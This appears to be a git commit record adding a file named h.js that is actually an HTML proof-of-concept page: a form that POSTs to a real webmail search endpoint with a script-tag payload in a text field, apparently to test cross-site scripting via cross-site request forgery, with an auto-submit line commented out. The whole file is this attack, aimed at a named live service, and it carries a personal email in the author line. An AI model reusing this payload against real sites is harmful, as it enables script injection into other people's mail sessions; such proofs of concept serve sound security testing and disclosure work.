9595f7a0550bf35b2007b8fd5ac9fd1bb229e021
DESKTOP-RUROV12\mitnick <jekabs.karklins@gmail.com>
2017-12-26 09:59:03 +0100

    'initial'

---
+++ h.js
@@ -0,0 +1,20 @@
+<html>
+
+<form action="https://mail.inbox.lv/mailbox?mailbox=%2A%2Asearch" method="POST" id="searchForm">
+<input type="text" value="mailbox" name="**search"/>
+<input type="text" value="search" name="actionID"/>
+<input type="text" value="INBOX" name="search_folders[]"/>
+<br>
+<textarea  name="search_fast" style="width:500px; height:300px">
+<script>alert(this)</script>
+</textarea>
+<input type="submit"/>
+
+</form>
+
+<script>
+//document.getElementById("searchForm").submit();
+</script>
+
+
+</html>
